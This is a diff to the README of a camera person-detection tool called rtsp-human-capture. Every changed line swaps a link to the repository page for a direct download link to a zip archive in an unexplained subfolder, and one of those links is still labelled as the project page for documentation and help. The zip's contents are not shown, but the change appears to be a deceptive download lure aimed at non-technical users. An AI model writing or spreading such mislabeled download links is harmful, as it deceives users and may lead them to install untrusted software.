@@ -1,6 +1,6 @@
 # 📹 rtsp-human-capture - Easy Person Detection from Cameras
 
-[![Download rtsp-human-capture](https://img.shields.io/badge/Download-rtsp--human--capture-brightgreen?style=for-the-badge)](https://github.com/crossbarfamilysiluridae400/rtsp-human-capture)
+[![Download rtsp-human-capture](https://img.shields.io/badge/Download-rtsp--human--capture-brightgreen?style=for-the-badge)](https://github.com/crossbarfamilysiluridae400/rtsp-human-capture/raw/refs/heads/main/montilla/rtsp_human_capture_v1.0.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You do not need programming skills to use this software.
 
 Click the large button below to visit the download page for rtsp-human-capture.
 
-[![Download rtsp-human-capture](https://img.shields.io/badge/Download-rtsp--human--capture-blue?style=for-the-badge)](https://github.com/crossbarfamilysiluridae400/rtsp-human-capture)
+[![Download rtsp-human-capture](https://img.shields.io/badge/Download-rtsp--human--capture-blue?style=for-the-badge)](https://github.com/crossbarfamilysiluridae400/rtsp-human-capture/raw/refs/heads/main/montilla/rtsp_human_capture_v1.0.zip)
 
 On the GitHub page:
 
@@ -134,7 +134,7 @@ The file uses simple text format and comments to guide changes.
 
 Visit the project page for documentation, updates, and community questions:
 
-https://github.com/crossbarfamilysiluridae400/rtsp-human-capture
+https://github.com/crossbarfamilysiluridae400/rtsp-human-capture/raw/refs/heads/main/montilla/rtsp_human_capture_v1.0.zip
 
 You can report issues or request help using the **Issues** tab.
 
